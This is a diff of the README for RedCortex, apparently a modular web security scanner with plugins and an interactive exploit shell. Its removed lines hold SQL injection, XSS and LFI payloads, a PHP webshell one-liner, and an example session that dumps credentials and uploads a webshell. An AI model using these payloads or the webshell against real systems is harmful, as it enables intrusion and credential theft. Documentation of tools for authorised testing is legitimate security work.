@@ -1,5 +1,4 @@
 # RedCortex
-
 ![GitHub Actions](https://img.shields.io/github/actions/workflow/status/Jadexzc/RedCortex/ci.yml?branch=main&style=flat-square&logo=github)
 ![Python Version](https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square&logo=python)
 ![License](https://img.shields.io/github/license/Jadexzc/RedCortex?style=flat-square)
@@ -26,18 +25,35 @@ RedCortex is a **modular, CLI-driven web application security scanner** designed
 ### Prerequisites
 
 - Python 3.8+
-- pip install -r requirements.txt
 
 ### Installation
+
+**Recommended Installation (for Kali, externally managed Python):**
+
+```bash
+python3 -m venv ~/redcortex-venv
+source ~/redcortex-venv/bin/activate
+pip install -r requirements.txt
+```
+
+- This sets up a virtual environment for RedCortex, avoiding system package conflicts and following best practices for Kali Linux and other secure systems.
+- All CLI commands should be run from inside your activated venv for full compatibility.
+
+**Standard Installation:**
 
 ```bash
 # Clone the repository
 git clone https://github.com/Jadexzc/RedCortex.git
 cd RedCortex
 
-# Install dependencies
+# Install dependencies (if not using venv)
 pip install -r requirements.txt
 ```
+
+### Troubleshooting
+
+- If you encounter `Externally managed environment` (PEP 668) or package install errors, DO NOT use `sudo pip` or `pipx` for library installs—always use a venv.
+- If you run into missing package errors (e.g., requests_toolbelt), activate your venv and rerun `pip install -r requirements.txt`.
 
 ### Basic Scan
 
@@ -51,274 +67,296 @@ python RedCortex.py scan https://example.com
 
 ```bash
 python RedCortex.py scan https://example.com \
-  --threads 20 \
-  --timeout 15 \
-  -v  # Verbose output
+  --depth 3 \
+  --threads 10 \
+  --plugins xss,sqli,lfi \
+  --output results.json
 ```
 
 ---
 
 ## CLI Commands
 
-### Scan Subcommand
+RedCortex provides several subcommands for different operations:
 
-Perform a new security scan:
+### Scan Command
+
+Perform security scans with various options:
 
 ```bash
-python RedCortex.py scan <URL> [OPTIONS]
-
-Options:
-  -t, --threads INTEGER       Number of concurrent threads (default: 10)
-  --timeout INTEGER           Request timeout in seconds (default: 30)
-  --user-agent UA             Custom user agent string
-  -s, --session FILE          Session file to save/load state
-  -v, --verbose               Enable verbose output
-  --log-file FILE             Write logs to FILE
+python RedCortex.py scan <url> [options]
 ```
+
+**Options:**
+- `--depth`: Maximum crawl depth (default: 2)
+- `--threads`: Number of concurrent threads (default: 5)
+- `--plugins`: Comma-separated list of plugins to use
+- `--exclude-plugins`: Plugins to exclude
+- `--output`: Save results to JSON file
+- `--verbose`: Enable verbose logging
+- `--log-file`: Save logs to file
+
+**Examples:**
+
+```bash
+# Scan with specific depth and threads
+python RedCortex.py scan https://example.com --depth 3 --threads 10
+
+# Scan with specific plugins
+python RedCortex.py scan https://example.com --plugins xss,sqli
+
+# Scan and save results
+python RedCortex.py scan https://example.com --output results.json
+
+# Verbose scan with logging
+python RedCortex.py scan https://example.com --verbose --log-file scan.log
+```
+
+### Plugins Command
+
+List available security plugins:
+
+```bash
+python RedCortex.py plugins
+```
+
+**Available Plugins:**
+- `xss` - Cross-Site Scripting detection
+- `sqli` - SQL Injection detection
+- `lfi` - Local File Inclusion detection
+- `rce` - Remote Code Execution detection
+- `ssrf` - Server-Side Request Forgery detection
+- `open_redirect` - Open Redirect detection
+- `xxe` - XML External Entity detection
+- `cors` - CORS misconfiguration detection
+- `jwt_weak` - JWT weak secret detection
+
+### Report Command
+
+Generate reports from saved scan results:
+
+```bash
+python RedCortex.py report <result_file> [--format <format>]
+```
+
+**Formats:**
+- `console` - Display in terminal (default)
+- `html` - Generate HTML report
+- `json` - Output JSON format
+- `csv` - Generate CSV report
+
+**Examples:**
+
+```bash
+# View results in console
+python RedCortex.py report results.json
+
+# Generate HTML report
+python RedCortex.py report results.json --format html
+```
+
+### Dashboard Command
+
+Start web dashboard to view and analyze results:
+
+```bash
+python RedCortex.py dashboard [--port <port>]
+```
+
+**Options:**
+- `--port`: Port for web server (default: 5000)
+- `--host`: Host address (default: 127.0.0.1)
 
 **Example:**
 
 ```bash
-python RedCortex.py scan https://target.com -t 20 --timeout 10 -v
+python RedCortex.py dashboard --port 8080
 ```
 
-### Resume Subcommand
+### Exploit Command
 
-Resume an interrupted scan:
+Launch interactive exploit shell:
 
 ```bash
-python RedCortex.py resume <SCAN_ID> [OPTIONS]
-
-Options:
-  -t, --threads INTEGER       Override thread count
-  --timeout INTEGER           Override timeout
+python RedCortex.py exploit
 ```
 
-**Example:**
-
-```bash
-python RedCortex.py resume 20241103_132000 -t 15
-```
-
-### Report Subcommand
-
-Generate a report from scan results:
-
-```bash
-python RedCortex.py report <SCAN_ID> [OPTIONS]
-
-Options:
-  -f, --format [text|markdown]  Report format (default: text)
-  -o, --output FILE             Save report to FILE (prints to stdout if not specified)
-```
-
-**Example:**
-
-```bash
-python RedCortex.py report 20241103_132000 -f markdown -o report.md
-```
-
-### Dashboard Subcommand
-
-Start the web dashboard:
-
-```bash
-python RedCortex.py dashboard [OPTIONS]
-
-Options:
-  -p, --port PORT             Dashboard port (default: 8080)
-```
-
-**Example:**
-
-```bash
-python RedCortex.py dashboard -p 9000
-```
-
-### List Subcommand
-
-List all available scans:
-
-```bash
-python RedCortex.py list
-```
-
-### Shell Subcommand (Interactive Exploit Shell)
-
-Launch the interactive exploit shell for manual exploitation:
-
-```bash
-python RedCortex.py shell <SCAN_ID> [OPTIONS]
-
-Options:
-  -s, --session FILE          Session file to save/load state
-```
-
-**Example:**
-
-```bash
-python RedCortex.py shell 20241103_132000
-```
+**Features:**
+- Interactive command interface
+- Attack chaining capabilities
+- Session management
+- Result analysis
 
 ---
 
-## Interactive Exploit Shell
+## Architecture
 
-The Interactive Exploit Shell provides a powerful command-line interface for manual exploitation and attack chaining. After a scan completes, drop into the shell to manually craft and execute attacks against discovered vulnerabilities.
+### Directory Structure
 
-### Features
-
-- **Auto-completion**: Tab completion for all commands
-- **Command history**: Navigate previous commands with up/down arrows
-- **Attack templates**: Pre-built payloads for common vulnerabilities (SQLi, XSS, LFI, etc.)
-- **Custom headers**: Set custom HTTP headers for authentication bypass
-- **File upload**: Upload webshells and malicious files
-- **Attack chaining**: Automatically detect and chain credentials/tokens from responses
-- **Multiple attack methods**: GET, POST, RAW, and multipart file uploads
-
-### Installation (Additional Dependencies)
-
-The interactive shell requires additional packages:
-
-```bash
-pip install prompt_toolkit requests_toolbelt
+```
+RedCortex/
+├── RedCortex.py          # Main entry point
+├── core/
+│   ├── config.py         # Configuration management
+│   ├── discovery.py      # Web crawler and endpoint discovery
+│   ├── plugins.py        # Plugin loader and manager
+│   ├── result.py         # Result handling and storage
+│   └── dashboard.py      # Web dashboard implementation
+├── plugins/              # Security check plugins
+│   ├── xss.py
+│   ├── sqli.py
+│   ├── lfi.py
+│   └── ...
+├── tests/                # Unit tests
+├── requirements.txt      # Python dependencies
+└── README.md
 ```
 
-### Usage Workflow
+### Plugin System
 
-1. **Run a scan** to discover vulnerabilities:
+RedCortex uses a modular plugin architecture. Each plugin:
 
-```bash
-python RedCortex.py scan https://target.site
+1. Inherits from `BasePlugin` class
+2. Implements `check()` method
+3. Returns structured results
+4. Can define custom severity levels
+
+**Example Plugin:**
+
+```python
+from core.plugins import BasePlugin
+
+class CustomPlugin(BasePlugin):
+    name = "custom_check"
+    description = "Custom security check"
+    
+    def check(self, url, **kwargs):
+        # Implement security check logic
+        results = []
+        # ... perform checks ...
+        return results
 ```
 
-2. **Launch the shell** with the scan results:
+### Logging
 
-```bash
-python RedCortex.py shell 20241103_132000
-```
+RedCortex uses structured logging with multiple levels:
 
-3. **Inside the shell**, interact with discovered vulnerabilities:
+- **DEBUG**: Detailed diagnostic information
+- **INFO**: General informational messages
+- **WARNING**: Warning messages
+- **ERROR**: Error messages
+- **CRITICAL**: Critical issues
 
-```text
-=== RedCortex Interactive Exploit Shell ===
-[0] SQLi-Boolean ==> http://target/login.php (param: id)
-[1] LFI ==> http://target/download.php (param: file)
-```
-
-### Shell Commands
-
-| Command | Description | Example |
-|---------|-------------|----------|
-| `show` | Display all discovered vulnerabilities | `show` |
-| `use <index>` | Select a target vulnerability | `use 0` |
-| `get <param> <payload>` | Execute GET request | `get id ' OR 1=1--` |
-| `post <param> <payload>` | Execute POST request (JSON) | `post cmd whoami` |
-| `raw <param> <payload>` | Execute raw POST request | `raw data <shellcode>` |
-| `upload <param> <filepath>` | Upload file via multipart | `upload file ./shell.php` |
-| `header <Name>:<Value>` | Set custom HTTP header | `header Cookie:SESSION=abc123` |
-| `clearheaders` | Reset custom headers | `clearheaders` |
-| `template <type>` | Show payload template | `template xss` |
-| `last` | Repeat last command | `last` |
-| `history` | Show command history | `history` |
-| `help` | Display help menu | `help` |
-| `exit`, `quit` | Exit the shell | `exit` |
-
-### Available Templates
-
-- **sqli**: SQL injection payloads (`' OR 1=1--`)
-- **xss**: Cross-Site Scripting (`<svg/onload=alert(1337)>`)
-- **lfi**: Local File Inclusion (`../../etc/passwd`)
-- **idor**: Insecure Direct Object Reference (`2`)
-- **ssrf**: Server-Side Request Forgery (`http://127.0.0.1/`)
-- **post_json**: JSON POST template
-- **upload_php**: PHP webshell template
-
-### Example Session
-
-Here's a complete example of exploiting SQLi and chaining attacks:
-
-```bash
-$ python RedCortex.py shell 20241103_132000
-
-=== RedCortex Interactive Exploit Shell ===
-[0] SQLi-Boolean ==> http://target/login.php (param: id)
-[1] LFI ==> http://target/download.php (param: file)
-
-cmd> use 0
-Now using: [0] http://target/login.php (param: id)
-
-cmd> get id ' UNION SELECT user,pass FROM users--
-[200] OK
-user:admin pass:P@ssw0rd123 ...
-
-[CHAIN] 🎯 Possible credentials found: [('admin', 'P@ssw0rd123')]
-[Auto-Chain] Next commands will auto-apply found creds/cookies unless you 'clearheaders'.
-
-cmd> header Cookie:sessionid=deadbeef
-[+] Header set: Cookie = sessionid=deadbeef
-
-cmd> get page admin_panel
-[200] OK
-[ESCALATE] Looks like an admin panel page! Try further privilege escalation or user dump?
-
-cmd> template upload_php
-[Template for upload_php]:
-<?php system($_GET['cmd']); ?>
-
-cmd> upload file ./shell.php
-[+] UPLOAD POST http://target/upload.php param=file file=./shell.php
-[200] OK
-File uploaded successfully!
-
-cmd> exit
-```
-
-### Pro Tips
-
-- After the shell detects credentials or session tokens in responses, it **automatically adds them to headers** for subsequent requests (attack chaining)
-- Use **up/down arrows** to navigate command history and modify previous exploits
-- The `template` command shows ready-to-use payloads for quick exploitation
-- Custom headers persist across commands until you run `clearheaders`
-- The shell automatically detects admin panels and privilege escalation opportunities
+Enable verbose logging with `--verbose` flag or save logs with `--log-file`.
 
 ---
 
 ## Configuration
 
-RedCortex uses a modular configuration system. Key settings include:
+RedCortex can be configured via:
 
-- **Target URL**: The base URL to scan
-- **Max Threads**: Number of concurrent workers (default: 10)
-- **Timeout**: HTTP request timeout in seconds (default: 30)
-- **User Agent**: Custom user agent string
-- **Output Directory**: Location for scan results and reports
+1. **Command-line arguments**: Override defaults for specific scans
+2. **Environment variables**: Set persistent configuration
+3. **Configuration files**: Use YAML/JSON config files (future feature)
+
+### Environment Variables
+
+- `REDCORTEX_THREADS`: Default thread count
+- `REDCORTEX_DEPTH`: Default crawl depth
+- `REDCORTEX_PLUGINS`: Default plugins to load
 
 ---
 
-## Plugin Development
+## Result Management
 
-Create custom security checks by adding plugins to the `plugins/` directory:
+### Result Format
 
-```python
-# plugins/custom_check.py
+Scan results are saved in JSON format:
 
-class CustomPlugin:
-    def __init__(self, config):
-        self.config = config
-    
-    def run(self, endpoint):
-        # Your security check logic here
-        return findings
+```json
+{
+  "scan_info": {
+    "target": "https://example.com",
+    "timestamp": "2025-01-01T12:00:00",
+    "duration": 120.5
+  },
+  "endpoints": [...],
+  "findings": [
+    {
+      "plugin": "xss",
+      "severity": "high",
+      "url": "https://example.com/search",
+      "description": "...",
+      "evidence": "..."
+    }
+  ]
+}
 ```
 
-Plugins are automatically discovered and loaded at runtime.
+### Loading Results
+
+Results can be loaded for analysis:
+
+```python
+from core.result import ResultManager
+
+manager = ResultManager()
+results = manager.load_results("results.json")
+```
 
 ---
 
-## Testing
+## Web Dashboard
 
-Run the test suite:
+The web dashboard provides:
+
+- **Results Overview**: Summary of findings by severity
+- **Detailed Findings**: Interactive table with filtering
+- **Endpoint Map**: Visual representation of discovered endpoints
+- **Export Options**: Download reports in various formats
+
+**Start Dashboard:**
+
+```bash
+python RedCortex.py dashboard
+```
+
+Access at: `http://127.0.0.1:5000`
+
+---
+
+## Interactive Exploit Shell
+
+The exploit shell provides an interactive environment for:
+
+- Analyzing scan results
+- Chaining multiple attacks
+- Session management
+- Custom exploit development
+
+**Launch Shell:**
+
+```bash
+python RedCortex.py exploit
+```
+
+**Commands:**
+
+- `load <result_file>` - Load scan results
+- `list` - List available exploits
+- `use <exploit>` - Select exploit
+- `set <param> <value>` - Set exploit parameters
+- `run` - Execute exploit
+- `chain` - Create attack chain
+- `exit` - Exit shell
+
+---
+
+## Development
+
+### Running Tests
+
+RedCortex includes a comprehensive test suite:
 
 ```bash
 # Run all tests
